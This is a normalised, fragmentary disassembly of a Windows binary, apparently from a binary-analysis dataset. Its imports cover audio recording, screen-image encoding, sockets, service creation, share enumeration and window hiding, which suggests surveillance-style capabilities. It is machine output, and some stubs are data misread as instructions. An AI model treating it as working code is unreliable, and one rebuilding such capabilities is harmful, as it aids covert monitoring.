mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_45ac75
jmp sub_404de4
sub_45ad24
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_45ad3c
inc [ eax + 0x6c ]
retn
sub_45ad40
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_45c8e8
sub_45aea0
call sub_45b590
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_45b97e
jmp sub_404de4
sub_45b985
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9aa
lea eax [ ebp - 0x44 ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_45b9a3
jmp sub_404de4
sub_45b9aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bd6a
jmp sub_404de4
sub_45bd71
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd8e
mov eax [ ebp - 0x4 ]
call sub_425608
retn
sub_45bd87
jmp sub_404de4
sub_45bd8e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bdab
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_45bda4
jmp sub_404de4
sub_45bdab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c291
jmp sub_404de4
sub_45c298
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c437
jmp sub_404de4
sub_45c43e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c544
jmp sub_404de4
sub_45c54b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c674
jmp sub_404de4
sub_45c6fb
jmp sub_404de4
sub_45c702
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c7c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45adac
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_45c910
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_45a8dc
sub_45c920
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_45d0bc
cmp dl 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_444cd0
call sub_443a84
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_444cd0
call sub_443ab8
retn
sub_45d481
jmp sub_404de4
sub_45d488
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d580
call GetCapture
retn
sub_45d588
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40f310
pop ebx
retn
sub_45d598
cmp [ rw-data ] 0x0
setne al
retn
sub_45d5c8
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_45d84e
jmp sub_404de4
sub_45da44
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_45dc58
jmp sub_404de4
sub_45dc5f
pop ebx
mov esp ebp
pop ebp
retn
sub_45dd38
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_45dd4c
mov [ edx + 0x8 ] 0x3
mov [ edx + 0x10 ] 0x3
mov [ edx + 0xc ] 0x3
mov [ edx + 0x14 ] 0x3
retn
sub_45de9f
jmp sub_404de4
sub_45e074
retn
sub_45e0d7
jmp sub_404de4
sub_45e0de
pop ebp
retn
sub_45e19b
add [ esp + 0x4 ] 0xfffffff4
jmp sub_45e518
sub_45e1a5
add [ esp + 0x4 ] 0xfffffff4
jmp sub_45e52c
sub_45e1b9
add [ esp + 0x4 ] 0xfffffff4
jmp sub_45e464
sub_45e1cd
add [ esp + 0x4 ] 0xfffffff4
jmp sub_45e4e8
sub_45e438
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_404974
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45e508
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_45e518
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_45e52c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_45e6b7
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406934
retn
sub_45e6c6
jmp sub_404de4
j_sub_45e6b7
jmp sub_45e6b7
sub_45e6cd
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_45e6d8
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_45e7b0
retn
sub_45e8fe
jmp sub_404de4
sub_45e905
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e90c
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
movzx eax [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_45e920
mov [ eax + 0x48 ] dl
retn
sub_45e924
push ebx
mov ebx eax
mov eax ebx
call sub_45e90c
cmp al 0x4
jne r-xdata
movzx eax [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_45e93c
mov [ eax + 0x40 ] dl
retn
sub_45e968
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_45e978
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_45e9ad
jmp sub_404de4
sub_45e9b4
pop ebp
retn
sub_45eb13
jmp sub_404de4
sub_45f6dc
jmp sub_404de4
sub_45f6fa
jmp sub_404de4
sub_45f718
jmp sub_404de4
mciSendStringA
jmp [ mciSendStringA@IAT ]
PlaySoundA
jmp [ PlaySoundA@IAT ]
waveInAddBuffer
jmp [ waveInAddBuffer@IAT ]
waveInClose
jmp [ waveInClose@IAT ]
waveInOpen
jmp [ waveInOpen@IAT ]
waveInPrepareHeader
jmp [ waveInPrepareHeader@IAT ]
waveInReset
jmp [ waveInReset@IAT ]
waveInStart
jmp [ waveInStart@IAT ]
waveInUnprepareHeader
jmp [ waveInUnprepareHeader@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipGetImageGraphicsContext
jmp [ GdipGetImageGraphicsContext@IAT ]
GdipGetImagePixelFormat
jmp [ GdipGetImagePixelFormat@IAT ]
GdipCreateBitmapFromScan0
jmp [ GdipCreateBitmapFromScan0@IAT ]
GdipCreateBitmapFromHBITMAP
jmp [ GdipCreateBitmapFromHBITMAP@IAT ]
GdipDeleteGraphics
jmp [ GdipDeleteGraphics@IAT ]
GdipSetInterpolationMode
jmp [ GdipSetInterpolationMode@IAT ]
GdipDrawImageRectI
jmp [ GdipDrawImageRectI@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
sub_45f8b4
push ebx
mov ebx eax
mov eax ebx
call sub_404618
push eax
call GdipAlloc
mov edx eax
mov eax ebx
call sub_40465c
pop ebx
retn
sub_45f8d0
push ebx
mov ebx eax
mov eax ebx
call sub_4046b4
push ebx
call GdipFree
pop ebx
retn
sub_45f9ec
push edx
push eax
call GdipGetImageEncodersSize
retn
sub_45f9f4
push ecx
push edx
push eax
call GdipGetImageEncoders
retn
sub_45fa7a
jmp sub_404de4
sub_45fa81
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_45faac
mov [ eax + 0x4 ] edx
retn
sub_45fab0
test edx edx
je r-xdata
mov eax edx
retn
mov [ eax + 0x8 ] edx
sub_45fc4c
mov [ eax + 0x4 ] edx
retn
sub_45fc50
test edx edx
je r-xdata
mov eax edx
retn
mov [ eax + 0x8 ] edx
sub_45fced
jmp sub_404de4
sub_45fcf4
pop ebp
retn
sub_45fdc8
jmp sub_404de4
sub_45fdcf
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ff4f
jmp sub_404de4
sub_45ff56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff73
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_45ff6c
jmp sub_404de4
sub_45ff73
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46003a
jmp sub_404de4
sub_460041
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46005e
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_460057
jmp sub_404de4
sub_46005e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46016e
in eax dx
jmp [ eax + 0x5400046 ]
sub_460508
push ebx
mov ebx eax
call WSAGetLastError
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_460524
push ebx
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
retn
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_460540
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_460574
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_46058c
push esi
push edi
mov edi edx
inc edx
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov si 0xffed
call sub_40484c
sub_4606bd
jmp sub_404de4
sub_4606c4
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46086d
jmp sub_404de4
sub_460874
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46096c
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_46098c
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4609ac
push rw-data
push 0x101
call WSAStartup
test eax eax
je r-xdata
retn
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
sub_4609ec
call WSACleanup
test eax eax
je r-xdata
retn
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
sub_460a4c
jmp sub_404de4
sub_460a53
pop ebp
retn
ControlService
jmp [ ControlService@IAT ]
CreateServiceA
jmp [ CreateServiceA@IAT ]
DeleteService
jmp [ DeleteService@IAT ]
EnumServicesStatusA
jmp [ EnumServicesStatusA@IAT ]
OpenSCManagerA
jmp [ OpenSCManagerA@IAT ]
OpenServiceA
jmp [ OpenServiceA@IAT ]
QueryServiceStatus
jmp [ QueryServiceStatus@IAT ]
StartServiceA
jmp [ StartServiceA@IAT ]
sub_46123d
jmp sub_404de4
sub_461244
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4613ca
jmp sub_404de4
sub_4613d1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4616a5
jmp sub_404de4
sub_4616ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461980
jmp sub_404de4
sub_461987
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461b33
jmp sub_404b30
sub_461b5f
jmp sub_404de4
sub_461b66
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461be7
jmp sub_404b30
sub_461c0e
jmp sub_404de4
sub_461c15
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461e1f
jmp sub_404de4
sub_461ef8
jmp sub_404de4
sub_461f3b
jmp sub_404de4
sub_461f42
mov esp ebp
pop ebp
retn
sub_46203f
jmp sub_404de4
sub_462049
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462066
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_46205f
jmp sub_404de4
sub_462066
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4620e4
jmp sub_404de4
sub_4620eb
pop ebx
mov esp ebp
pop ebp
retn
sub_462139
jmp sub_404de4
sub_462140
pop ebx
pop ecx
pop ebp
retn
sub_4621a0
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_462248
retn
sub_46227d
jmp sub_404de4
sub_462284
pop ebp
retn
sub_462713
add [ esp + 0x4 ] 0xffffffe8
jmp sub_4070e0
sub_462983
jmp sub_404de4
sub_46298a
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462992
add [ eax ] al
add [ edx ] ch
daa
push ebp

sub_462a15
jmp sub_404b30
sub_462abe
jmp sub_404de4
sub_462ac5
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462b58
jmp sub_404de4
sub_462b5f
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_462eb6
jmp sub_404de4
sub_462ebd
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46308b
jmp sub_404de4
sub_463092
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46309a
add [ eax ] al
add [ edx ] ch
daa
push ebp

sub_4631d2
jmp sub_404b30
sub_463223
jmp sub_404de4
sub_46322a
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46344c
jmp sub_404b30
sub_4634f8
movzx edx [ eax + 0x44 ]
call sub_4632c4
retn
sub_463591
jmp sub_404de4
sub_463598
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4636f2
jmp sub_404de4
sub_4636f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463700
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_4635a4
pop ebx
retn
sub_463a86
jmp sub_404de4
sub_463a8d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463b65
jmp sub_404de4
sub_463b6c
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463cb0
jmp sub_404de4
sub_463cb7
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463d74
jmp sub_404b30
sub_463d79
call sub_404f40
sub_463d7e
retn
sub_463d7f
jmp sub_404de4
sub_463d86
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4049c4
sub_463f19
jmp sub_404de4
sub_463fde
jmp sub_404b30
sub_464228
push ecx
mov [ esp ] edx
mov eax esp
call sub_4629c0
pop edx
retn
sub_464295
jmp sub_404b30
sub_46438b
jmp sub_404b30
sub_464446
jmp sub_404de4
sub_46444d
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4649b3
jmp sub_404de4
sub_464bb2
jmp sub_404b30
sub_464bd7
jmp sub_404de4
sub_464bde
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464ce3
jmp sub_404de4
sub_464cea
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464cf8
mov ecx [ eax + 0x2c ]
call sub_464c40
retn
sub_464d04
mov [ eax + 0x24 ] edx
retn
sub_464ee2
jmp sub_404de4
sub_464ee9
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464f83
jmp sub_404de4
sub_46505d
jmp sub_404de4
sub_465064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465089
lea eax [ ebp - 0x14 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_465082
jmp sub_404de4
sub_465089
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465132
jmp sub_404b30
sub_46515b
jmp sub_404de4
sub_465162
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465223
jmp sub_404b30
sub_465255
jmp sub_404de4
sub_46525c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46529c
push ebp
mov ebp esp
mov ecx eax
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
sub eax [ ebp + 0x8 ]
sbb edx [ ebp + 0xc ]
mov [ ecx ] eax
pop ebp
retn 0x8
sub_4652e0
jmp sub_404b30
sub_465330
jmp sub_404b30
sub_465348
sub edx eax
mov eax edx
retn
sub_46538c
mov eax [ eax ]
lea eax [ eax + edx * 8 + 0x78 ]
retn
sub_465394
and ax 0xffff
retn
sub_46539c
test eax 0x80000000
setne al
retn
sub_4657d8
jmp sub_404de4
sub_4657df
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4657ef
jmp [ esi ]
sub_46581f
jmp [ esi ]
sub_46584f
jmp [ edi ]
sub_4659df
jmp [ edi ]
sub_465c87
jmp sub_404b30
sub_465cb7
[ edi ]
sub_465d2b
jmp [ edi ]
sub_465d5b
[ eax + eax ]
sub_465d93
[ ebx ]
sub_465dc7
[ eax ]
sub_466129
jmp sub_404de4
sub_466130
pop ebp
retn
sub_4661a5
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4661ec
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_46631c
xor edx edx
mov eax ebx
call sub_4662e4
pop ebx
retn
sub_466264
retn
sub_466268
retn
sub_46638c
retn
acmStreamOpen
jmp [ acmStreamOpen@IAT ]
acmStreamClose
jmp [ acmStreamClose@IAT ]
acmStreamSize
jmp [ acmStreamSize@IAT ]
acmStreamReset
jmp [ acmStreamReset@IAT ]
acmStreamConvert
jmp [ acmStreamConvert@IAT ]
acmStreamPrepareHeader
jmp [ acmStreamPrepareHeader@IAT ]
acmStreamUnprepareHeader
jmp [ acmStreamUnprepareHeader@IAT ]
sub_4666e5
jmp sub_404b30
sub_466724
cmp dl [ eax + 0xec ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_466424
call sub_46661c
jmp r-xdata
sub_466740
cmp [ eax + 0xec ] 0x0
jne r-xdata
retn
mov [ eax + 0xf8 ] edx
sub_466874
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_466a71
jmp sub_404de4
sub_466bc8
mov ecx [ edx ]
sub ecx 0x3c0
jne r-xdata
retn
mov edx [ edx + 0x8 ]
call sub_4669d4
sub_466c34
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
mov [ eax + 0xc ] edx
sub_466f3b
jmp sub_404de4
sub_466fd9
jmp sub_404de4
sub_466fe0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46757f
jmp sub_404de4
sub_467586
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4676b4
mov eax edx
call sub_402f1c
retn
sub_4676bc
push ebp
mov ebp esp
movzx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
call sub_403af4
pop ebp
retn
sub_4676e4
push 0x38
mov ecx r-xdata
call sub_467c84
retn
sub_4676fc
mov edx r-xdata
mov ecx 0x38
call sub_469a5c
retn
sub_467c84
push ebp
mov ebp esp
push 0xf
push 0x8
push 0x0
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx 0x8
call sub_467ca0
pop ebp
retn 0x4
sub_469a5c
push ecx
mov ecx 0xf
xchg edx ecx
call sub_469990
retn
sub_469a6c
mov [ eax + 0x48 ] rw-data
mov [ eax + 0x50 ] 0x9
mov [ eax + 0x4c ] rw-data
mov [ eax + 0x54 ] 0x5
retn
sub_46b22c
retn
sub_46d110
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xffffffff
call sub_46d070
pop ebx
pop ebp
retn 0x4
sub_46d124
mov edx eax
shr edx 0xc
add edx eax
shr eax 0xe
add edx eax
add edx 0xb
mov eax edx
retn
sub_46d2e0
retn
sub_46d2e1
jmp sub_404de4
j_sub_46d2e0
jmp sub_46d2e0
sub_46d2e8
pop ebp
retn
sub_46d354
jmp sub_404de4
sub_46d35b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d3d9
jmp sub_404de4
sub_46d3e0
pop ecx
pop ecx
pop ebp
retn
sub_46d6ee
jmp sub_404b30
sub_46d75f
jmp sub_404de4
sub_46d766
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d995
jmp sub_404de4
sub_46d99c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46da10
push ebx
mov ebx eax
push 0x0
mov eax ebx
call sub_4059dc
push eax
call CreateDirectoryA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_46db18
push 0x0
push r-xdata
call FindWindowA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x0
push eax
call ShowWindow
retn
sub_46db5c
push 0x0
push r-xdata
call FindWindowA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x5
push eax
call ShowWindow
retn
sub_46dba0
push 0x0
push r-xdata
call FindWindowA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x0
push eax
call ShowWindow
retn
sub_46dbe4
push 0x0
push r-xdata
call FindWindowA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x5
push eax
call ShowWindow
retn
sub_46dc28
push 0x0
push r-xdata
push 0x0
push 0x0
call FindWindowExA
push 0x0
push eax
call ShowWindow
retn
sub_46dc4c
push 0x0
push r-xdata
push 0x0
push 0x0
call FindWindowExA
push 0x5
push eax
call ShowWindow
retn
sub_46dd09
jmp sub_404de4
sub_46dd2b
jmp sub_404de4
sub_46dd32
pop ebx
mov esp ebp
pop ebp
retn
sub_46ddd6
jmp sub_404de4
sub_46ddf8
jmp sub_404de4
sub_46ddff
pop ebx
mov esp ebp
pop ebp
retn
sub_46df1d
jmp sub_404de4
sub_46df24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e0ce
jmp sub_404de4
sub_46e0d5
mov esp ebp
pop ebp
retn
sub_46e238
jmp sub_404de4
sub_46e23f
mov esp ebp
pop ebp
retn
sub_46e391
jmp sub_404de4
sub_46e398
mov esp ebp
pop ebp
retn
sub_46e3e6
jmp sub_404de4
sub_46e3ed
pop ebp
retn
sub_46e55e
jmp sub_404de4
sub_46e565
pop ebx
mov esp ebp
pop ebp
retn
NetShareEnum
jmp [ NetShareEnum@IAT ]
NetShareGetInfo
jmp [ NetShareGetInfo@IAT ]
sub_46e945
jmp sub_404b30
sub_46e984
jmp sub_404de4
sub_46e98b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46eaa8
jmp sub_404de4
sub_46eaaf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46edd5
jmp sub_404de4
sub_46ede6
jmp sub_404b30
sub_46ee22
jmp sub_404de4
sub_46ee29
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ef49
jmp sub_404de4
sub_46ef50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ef7a
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
sub_46ef73
jmp sub_404de4
sub_46ef7a
mov esp ebp
pop ebp
retn 0x4
sub_46f02a
jmp sub_404de4
sub_46f031
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f05b
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
sub_46f054
jmp sub_404de4
sub_46f05b
mov esp ebp
pop ebp
retn 0x4
sub_46f10e
jmp sub_404de4
sub_46f115
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f13f
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
sub_46f138
jmp sub_404de4
sub_46f13f
mov esp ebp
pop ebp
retn 0x4
sub_46f2ed
jmp sub_404de4
sub_46f2f4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46f519
jmp sub_404de4
sub_46f520
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46f5bc
push ebx
mov ebx eax
mov eax rw-data
call sub_405530
push 0x0
push sub_46f3b8
call EnumWindows
mov eax ebx
mov edx [ rw-data ]
call sub_405584
pop ebx
retn
sub_46f6b7
jmp sub_404de4
sub_46f6be
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46f6e0
push ebx
mov ebx eax
mov eax rw-data
call sub_405530
push 0x0
push sub_46f5e4
call EnumWindows
mov eax ebx
mov edx [ rw-data ]
call sub_405584
pop ebx
retn
sub_46f739
jmp sub_404de4
sub_46f740
pop ebp
retn
sub_46fd1f
jmp sub_404de4
sub_46fd26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ffc2
jmp sub_404de4
sub_46ffc9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47013d
jmp sub_404b30
sub_470164
jmp sub_404de4
sub_47016b
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47028a
jmp sub_404b30
sub_4702b1
jmp sub_404de4
sub_4702b8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4703f0
jmp sub_404de4
sub_4703f7
mov esp ebp
pop ebp
retn
sub_470664
jmp sub_404de4
sub_47066b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4708b9
jmp sub_404de4
sub_4708c0
mov esp ebp
pop ebp
retn
sub_470a03
jmp sub_404de4
sub_470a0a
mov esp ebp
pop ebp
retn
sub_470b4f
jmp sub_404de4
sub_470b56
mov esp ebp
pop ebp
retn
sub_470c74
jmp sub_404de4
sub_470c7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470e2f
jmp sub_404de4
sub_470e93
jmp sub_404de4
sub_470e9a
mov esp ebp
pop ebp
retn
sub_471078
push 0x5
push 0x0
push r-xdata
call FindWindowA
push eax
call ShowWindow
retn
sub_4710a0
push 0x0
push 0x0
push r-xdata
call FindWindowA
push eax
call ShowWindow
retn
sub_4710c8
push eax
push 0x0
push 0x0
push r-xdata
call mciSendStringA
retn
sub_4711ba
jmp sub_404de4
sub_4711c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471291
jmp sub_404de4
sub_471298
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_471332
jmp sub_404de4
sub_471339
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471343
jmp [ edx ]
sub_47159e
jmp sub_404de4
sub_4715a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47162f
jmp sub_404de4
sub_471636
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471828
jmp sub_404de4
sub_47182f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47193b
jmp sub_404b30
sub_471976
jmp sub_404de4
sub_47197d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47198b
jmp [ edx ]
sub_471acf
jmp sub_404b30
sub_471c0f
jmp sub_404b30
j_sub_404b30#3
jmp sub_404b30
sub_471e5f
jmp sub_404b30
sub_471f86
jmp sub_404b30
sub_4720f6
jmp sub_404b30
sub_472245
jmp sub_404b30
sub_472327
jmp sub_404b30
j_sub_404b30#5
jmp sub_404b30
sub_47256f
jmp sub_404b30
j_sub_404b30#9
